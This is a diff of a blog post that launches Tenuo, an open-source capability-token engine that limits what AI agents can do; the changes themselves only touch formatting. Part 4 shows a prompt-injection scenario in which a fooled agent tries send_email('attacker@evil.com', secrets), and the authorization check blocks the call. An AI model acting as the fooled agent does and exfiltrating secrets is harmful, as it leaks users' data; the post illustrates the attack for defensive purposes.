@@ -9,8 +9,6 @@ tags: ["security", "ai", "agents", "llm", "capabilities", "tenuo", "open-source"
 
 Today I'm releasing [Tenuo](https://github.com/tenuo-ai/tenuo): an open-source capability engine for AI agents.
 
-<!-- more -->
-
 I originally tried to [secure agent delegation with IAM](https://niyikiza.com/posts/authority-isolation/). I eventually [concluded it can't express the problem](https://niyikiza.com/posts/capability-delegation/).
 
 Agents decompose tasks.  
@@ -22,8 +20,6 @@ The fix is task-scoped authority.
 This is the implementation.
 
 Rust core. Python bindings. ~27μs verification on commodity hardware.
-
----
 
 ## The Thirty-Second Version
 
@@ -50,8 +46,6 @@ If you’re skimming: Tenuo is a capability engine for AI agents that makes auth
 
 If you only read one section, read [Part 3: Authority That Lives and Dies With the Task](#part-3-authority-that-lives-and-dies-with-the-task).
 
----
-
 ## Part 1: The Valet Key, Implemented
 
 In my last post, I used the valet key analogy: a key that starts the engine but won't open the trunk. You don't trust the valet to follow instructions. The key *is* the policy.
@@ -69,9 +63,7 @@ warrant = Warrant.issue(
     holder=agent_keypair.public_key
 )
 ```
-
 No ambient authority. No policy server. The warrant carries:
-
 - **Tools**: What can be invoked
 - **Constraints**: Bounds on arguments  
 - **TTL**: When authority expires
@@ -81,8 +73,6 @@ No ambient authority. No policy server. The warrant carries:
 Everything travels with the request. Verification is local.
 
 This solves access. It does not yet solve delegation.
-
----
 
 ## Part 2: The Expense Card Model
 
@@ -145,10 +135,7 @@ bad_warrant = intern_warrant.attenuate(
     constraints={"amount": Range(max=10000)}  # Can't exceed parent's $500
 )
 ```
-
 Attenuation isn't policy. It's physics.
-
----
 
 ## Part 3: Authority That Lives and Dies With the Task
 
@@ -206,7 +193,6 @@ async def handle_user_request(user_request: str):
     )
     await writer.execute(write_warrant, findings)
 
-
 # ┌─────────────────────────────────────────────────────────────────┐
 # │ WORKER: Executes with attenuated warrant, every call verified  │
 # └─────────────────────────────────────────────────────────────────┘
@@ -245,8 +231,6 @@ No cleanup. No revocation. The warrant simply expires.
 
 This is what I meant by "authority that follows the flow."
 
----
-
 ## Part 4: Confused Deputy, Solved
 
 My last post described the confused deputy problem: an agent with legitimate authority being tricked into misusing it. The agent doesn't know *why* it has authority, only that it does.
@@ -272,12 +256,9 @@ async with root_task(tools=["read_file"], path="/data/*"):
     send_email("attacker@evil.com", secrets)  # ✗ AuthorizationError
     # Tool "send_email" not in warrant
 ```
-
 The LLM was fooled. The deputy was not confused. There was nothing to be confused about: the only authority that exists is the authority in the warrant, and `send_email` isn't there.
 
 The attack succeeds at the language layer. It fails at the authorization layer.
-
----
 
 ## Part 5: The CaMeL Connection
 
@@ -324,7 +305,6 @@ But it doesn't provide an implementation. The tokens are assumed to exist.
 
 ***Tenuo is one concrete implementation of those tokens, designed for agent tool execution.***
 
-
 | CaMeL Describes | Tenuo Provides |
 |-----------------|----------------|
 | "Capability tokens" | Warrants |
@@ -333,7 +313,6 @@ But it doesn't provide an implementation. The tokens are assumed to exist.
 | "Issued by P-LLM" | `Warrant.issue()` |
 | "Held by Q-LLM" | Holder binding + PoP |
 | "Checked by interpreter" | `@lockdown` decorator |
-
 
 CaMeL also tracks **data flow**: which variables are tainted by untrusted input. That's orthogonal to Tenuo. Tenuo tracks **action flow**: which operations are authorized by the capability chain.
 
@@ -351,8 +330,6 @@ I also found [Microsoft FIDES](https://arxiv.org/abs/2505.23643), which focuses 
 | Action flow | Tenuo | "Is this action authorized?" |
 
 Tenuo doesn't replace CaMeL. It makes CaMeL deployable.
-
----
 
 ## Part 6: Building on Prior Art
 
@@ -410,7 +387,6 @@ constraints={
     "encoding": OneOf(["utf-8", "ascii"]),       # Allowlist
 }
 ```
-
 **The Database Pattern.** For SQL or GraphQL tools, constrain the query structure, not just the inputs:
 ```python
 # SQL tool
@@ -420,7 +396,6 @@ constraints={
     "limit": Range(max=1000),                    # Prevent DoS
 }
 ```
-
 **The SaaS Tenant Pattern.** For multi-tenant APIs, scope authority to specific IDs and roles:
 ```python
 # Multi-tenant API
@@ -430,7 +405,6 @@ constraints={
     "feature_flags": Pattern("beta-*"),          # Feature access control
 }
 ```
-
 No policy language to learn. The tradeoff is expressiveness: Datalog can express recursive policies that Tenuo cannot. But for "are these arguments within the bounds the orchestrator delegated," the simpler model fits the use case without introducing a new DSL.
 
 ### Divergence 3: AI Framework Integration
@@ -451,7 +425,6 @@ tool_node = TenuoToolNode(tools)
 @lockdown(tool="read_file")
 def read_file(path: str): ...
 ```
-
 You could build this on Biscuit (it's a few weeks of work). Tenuo includes it because that's the use case it's designed for.
 
 ### When to Use What
@@ -469,8 +442,6 @@ If you need general-purpose capability tokens, Biscuit is mature and battle-test
 If you need capability tokens specifically for AI agents processing untrusted input, that's what Tenuo is for.
 
 Standing on shoulders. Diverging where the threat model demands it.
-
----
 
 ## Part 7: What's in v0.1
 
@@ -506,8 +477,6 @@ Benchmarks are reproducible: [run them yourself](https://github.com/tenuo-ai/ten
 
 This is v0.1. Early. Opinionated. The [README](https://github.com/tenuo-ai/tenuo) has the full details.
 
----
-
 ## Part 8: Integration Patterns
 
 **LangChain**: wrap existing tools:
@@ -528,9 +497,8 @@ tool_node = TenuoToolNode(tools)
 # Or scope individual nodes
 @tenuo_node(tools=["search"], query="*public*")
 async def researcher(state):
-    ...
-```
 
+```
 **Kubernetes**: sidecar authorizer:
 ```yaml
 # See docs/kubernetes.md for full pattern
